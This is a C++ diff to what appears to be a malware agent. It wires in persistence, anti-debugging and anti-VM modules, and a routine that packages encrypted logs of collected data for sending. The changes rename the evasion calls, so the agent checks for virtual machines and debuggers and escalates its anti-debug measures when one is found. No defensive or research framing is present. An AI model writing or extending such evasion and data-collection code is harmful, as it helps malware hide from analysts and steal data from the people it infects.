@@ -9,6 +9,8 @@
 #include "common.h"
 #include "persistence/advanced_persistence.h"
 #include "integration.h"
+#include "stealth/anti_debug.h"
+#include "stealth/anti_vm.h"
 
 // Forward declarations for modules
 extern "C" {
@@ -24,6 +26,7 @@ extern "C" {
     void InitEncryptedLogger();
     void AddEncryptedLog(const char* dataType, const char* jsonData);
     const char* GetAgentId();
+    std::vector<uint8_t> EncryptLogs();
     
     // Module functions (to be implemented)
     bool CheckMainEnvironment();       // Anti-VM/Anti-Debug checks
@@ -261,7 +264,6 @@ private:
         LogInfo("Sending collected data...");
         
         // Get encrypted data package
-        extern std::vector<uint8_t> EncryptLogs();
         std::vector<uint8_t> encryptedData = EncryptLogs();
         
         if (encryptedData.empty()) {
@@ -410,20 +412,14 @@ std::unique_ptr<Agent> g_agent;
 
 // Anti-analysis checks (implemented in stealth modules)
 bool CheckMainEnvironment() {
-    extern bool CheckForDebugger();
-    extern void ApplyAntiDebugProtection();
-    
     LogInfo("Starting comprehensive environment analysis...");
-    
-    // First, declare external functions
-    extern bool CheckVMEnvironment();
     
     bool vmDetected = false;
     bool debuggerDetected = false;
     
     try {
         // Check for virtual machine environment
-        vmDetected = !CheckVMEnvironment(); // CheckVMEnvironment returns true if clean
+        vmDetected = !CheckEnvironment(); // CheckEnvironment returns true if clean
         if (vmDetected) {
             LogError("Virtual machine environment detected");
         } else {
@@ -431,10 +427,10 @@ bool CheckMainEnvironment() {
         }
         
         // Check for debugger presence
-        debuggerDetected = CheckForDebugger();
+        debuggerDetected = IsDebuggerAttached();
         if (debuggerDetected) {
             LogError("Debugger presence detected");
-            ApplyAntiDebugProtection();
+            EnableAdvancedAntiDebug();
         } else {
             LogInfo("Debugger check passed");
         }
